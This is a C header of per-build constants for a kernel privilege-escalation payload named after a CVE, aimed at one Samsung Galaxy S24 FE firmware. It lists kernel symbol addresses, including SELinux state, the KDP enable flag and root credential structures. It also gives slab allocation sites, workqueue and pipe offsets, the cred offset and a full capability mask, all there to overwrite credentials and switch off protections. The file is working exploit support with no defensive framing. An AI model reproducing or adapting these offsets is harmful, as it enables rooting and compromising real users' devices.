/*
 * offsets.h -- per-build constants for the CVE-2026-98260 (SamTimer) payload.
 *
 * Device: Samsung Galaxy S24 FE (SM-S721B / r12s / Exynos 2400e / OXM)
 * Kernel: 6.1.162-android14-11  (release has NO "-<build>-ab<suffix>" part)
 * Firmware: S721BXXUEEZIF (One UI 9.0, security patch 2026-09-05)
 * Source: boot.img of the AP package, built 2026-09-19 (clang 17.0.2)
 *
 * Derived from the device's vmlinux (kallsyms via vmlinux-to-elf) + .BTF.
 * Struct layouts were diffed against the EZIF (e3q, 6.1.162) kernel and are
 * IDENTICAL (k_itimer/cred/task_struct/pipe/workqueue/worker_pool/page...),
 * so only the per-build symbol addresses and the three kmem_cache_alloc call
 * sites below were re-derived.
 *
 * Derivation method (reproduced exactly on EZIF to validate the workflow):
 *   - site = return address of the `bl kmem_cache_alloc*` right after the
 *     object-specific argument setup:
 *       do_timer_create+0xa4 call -> site do_timer_create+0xa8
 *       prepare_creds+0x1c  call -> site prepare_creds+0x20
 *       dup_task_struct+0x50 call -> site dup_task_struct+0x54
 *   - *_LOW21 = site & 0x1FFFFF
 *   - struct addresses come straight from kallsyms (uns.hifted link-time)
 */
#ifndef OFFSETS_H_R12S
#define OFFSETS_H_R12S

/* do_timer_create: bl kmem_cache_alloc @ ...194fdc -> return ...194fe0 */
#define STATIC_TIMER_SITE        0xffffffc008194fe0ULL
#define TIMER_SITE_LOW21         0x194fe0ULL
#define TIMER_ALLOC              0x108ULL   /* sizeof(k_itimer), BTF */

/* cred: kmem_cache_alloc in prepare_creds @ ...0e5e6c -> ...0e5e70 */
#define CRED_SITE_STATIC         0xffffffc0080e5e70ULL
#define CRED_REQ                 0xb0ULL    /* sizeof(cred), BTF */
#define CRED_ALLOC               0xc0ULL    /* HWCACHE_ALIGN */
#define CRED_ALLOC_KDP           0xd0ULL    /* KDP-tracked cred slab (empirical) */

/* task_struct: kmem_cache_alloc_node in dup_task_struct @ ...0acb78 -> ...0acb7c */
#define TASK_SITE_STATIC         0xffffffc0080acb7cULL
#define TASK_ALLOC_LOW21         0xacb7cULL
#define TASK_ALLOC_BYTES         0x12c0ULL  /* sizeof(task_struct), BTF */

/* kallsyms (link-time) */
#define SELINUX_STATE_STATIC     0xffffffc00a5ea4a8ULL
#define PANIC_ON_WARN_STATIC     0xffffffc00a2eac00ULL
#define KDP_ENABLE_STATIC        0xffffffc0097edf18ULL
#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc00a2eac58ULL
#define UMH_EXEC_WORK_STATIC     0xffffffc0080d4584ULL
#define ANON_PIPE_BUF_OPS_STATIC 0xffffffc00921ea10ULL
#define CREDS_FAST_HASH_STATIC   0xffffffc00a66e9f8ULL
#define ROOT_USER_STATIC         0xffffffc00a310a00ULL
#define INIT_USER_NS_STATIC      0xffffffc00a310770ULL
#define INIT_UCOUNTS_STATIC      0xffffffc00a3121d8ULL
#define INIT_GROUPS_STATIC       0xffffffc00a311d20ULL

/* VA layout (unchanged across 6.1.162 Samsung builds) */
#define KERNEL_VA_BASE           0xffffffc008000000ULL
#define LINEAR_MAP_BASE          0xffffff7f80000000ULL
#define VMEMMAP_BASE             0xfffffffe00000000ULL
#define MEMSTART_ADDR            0x80000000ULL
#define KERNEL_PHYS_LOAD         0xa8000000ULL

/* struct field offsets: identical to the EZIF 6.1.162 build (BTF-verified) */
#define STRUCT_PAGE_SIZE         0x40ULL
#define PIPE_INFO_BUF_OFF        0xa8
#define PIPE_BUF_FAKE_OFF        0x28
#define WQ_DFL_PWQ_OFF           0x110   /* payload-side constant, kept as-is */
#define PWQ_POOL_OFF             0x00
#define PWQ_WQ_OFF               0x08
#define PWQ_WORK_COLOR_OFF       0x10
#define PWQ_NR_IN_FLIGHT_OFF     0x1c
#define PWQ_NR_ACTIVE_OFF        0x5c
#define PWQ_MAX_ACTIVE_OFF       0x60
#define POOL_WORKLIST_OFF        0x28
#define WORK_DATA_OFF            0x00
#define WORK_ENTRY_OFF           0x08
#define WORK_FUNC_OFF            0x18
#define OFF_TASK_CRED            0x838ULL
#define CRED_UID_OFF             0x4ULL
#define CRED_SECUREBITS_OFF      0x24ULL
#define FULLCAP                  0x1ffffffffffULL

#endif
